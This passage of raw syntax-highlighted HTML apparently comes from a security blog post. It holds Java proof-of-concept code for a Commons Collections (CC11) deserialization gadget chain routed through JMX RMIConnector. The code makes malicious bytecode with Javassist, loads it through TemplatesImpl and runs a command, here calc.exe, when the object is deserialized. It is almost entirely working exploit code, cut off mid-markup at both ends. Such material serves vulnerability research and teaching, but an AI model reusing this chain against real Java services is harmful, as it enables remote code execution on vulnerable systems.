class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">R</span><span style=\"color: #C678DD\">mi</span><span style=\"color: #FFFFFF\">C</span><span style=\"color: #C678DD\">onnector</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.InvokerTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.map.LazyMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javax.management.remote.JMXServiceURL</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javax.management.remote.rmi.RMIConnector</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Base64</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.HashMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Map</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">RmiConnectorPOC1</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> main</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75; font-style: italic\">args</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">JMXServiceURL</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">jmxServiceURL</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">JMXServiceURL</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;service:jmx:rmi://&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">RmipayloadGenerator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">rmipayloadGenerator</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">RmipayloadGenerator</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(jmxServiceURL,</span><span style=\"color: #98C379\">&quot;urlPath&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #98C379\">&quot;/stub/&quot;</span><span style=\"color: #56B6C2\">+</span><span style=\"color: #E5C07B\">rmipayloadGenerator</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getbase64CC11payload</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">RMIConnector</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">rmiConnector</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">RMIConnector</span><span style=\"color: #ABB2BF\">(jmxServiceURL,</span><span style=\"color: #D19A66\">null</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">InvokerTransformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">transformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">InvokerTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;toString&quot;</span><span style=\"color: #ABB2BF\">,</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[</span><span style=\"color: #D19A66\">0</span><span style=\"color: #ABB2BF\">], </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[</span><span style=\"color: #D19A66\">0</span><span style=\"color: #ABB2BF\">]);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">innerMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Map</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">m</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">LazyMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">decorate</span><span style=\"color: #ABB2BF\">(innerMap, transformer);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">outerMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">HashMap</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">TiedMapEntry</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">tied</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">TiedMapEntry</span><span style=\"color: #ABB2BF\">(m,rmiConnector);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">outerMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(tied, </span><span style=\"color: #98C379\">&quot;t&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">innerMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">clear</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(transformer, </span><span style=\"color: #98C379\">&quot;iMethodName&quot;</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #98C379\">&quot;connect&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">unSerial</span><span style=\"color: #ABB2BF\">(outerMap);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #61AFEF\"> unSerial</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">o</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bs</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">out</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectOutputStream</span><span style=\"color: #ABB2BF\">(bs);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">writeObject</span><span style=\"color: #ABB2BF\">(o);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectInputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">in</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">()));</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">readObject</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">close</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> Base64Encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">bs</span><span style=\"color: #ABB2BF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">encode</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Base64</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getEncoder</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">s</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">String</span><span style=\"color: #ABB2BF\">(encode);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(s);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">s</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">length</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> setFieldValue</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">obj</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">field</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">arg</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">f</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">obj</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getClass</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(field);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(obj, arg);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">R</span><span style=\"color: #C678DD\">mi</span><span style=\"color: #FFFFFF\">C</span><span style=\"color: #C678DD\">onnector</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.ClassPool</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtClass</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtConstructor</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.InvokerTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.map.LazyMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Base64</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.HashMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Map</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">RmipayloadGenerator</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #61AFEF\"> getbase64CC11payload</span><span style=\"color: #ABB2BF\">()</span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//javassist写恶意字节码</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ClassPool</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">pool</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">ClassPool</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getDefault</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CtClass</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">ctClass</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">pool</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">makeClass</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;i&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CtClass</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">superClass</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">pool</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">get</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ctClass</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setSuperclass</span><span style=\"color: #ABB2BF\">(superClass);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CtConstructor</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">constructor</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">ctClass</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">makeClassInitializer</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">constructor</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setBody</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;Runtime.getRuntime().exec(</span><span style=\"color: #56B6C2\">\\&quot;</span><span style=\"color: #98C379\">calc.exe</span><span style=\"color: #56B6C2\">\\&quot;</span><span style=\"color: #98C379\">);&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">bytes</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">ctClass</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toBytecode</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//CC11攻击流程</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">TemplatesImpl</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">templates</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">TemplatesImpl</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(templates, </span><span style=\"color: #98C379\">&quot;_bytecodes&quot;</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[][]&#123;bytes&#125;);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(templates, </span><span style=\"color: #98C379\">&quot;_name&quot;</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #98C379\">&quot;t&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">InvokerTransformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">transformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">InvokerTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;toString&quot;</span><span style=\"color: #ABB2BF\">,</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[</span><span style=\"color: #D19A66\">0</span><span style=\"color: #ABB2BF\">], </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[</span><span style=\"color: #D19A66\">0</span><span style=\"color: #ABB2BF\">]);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: 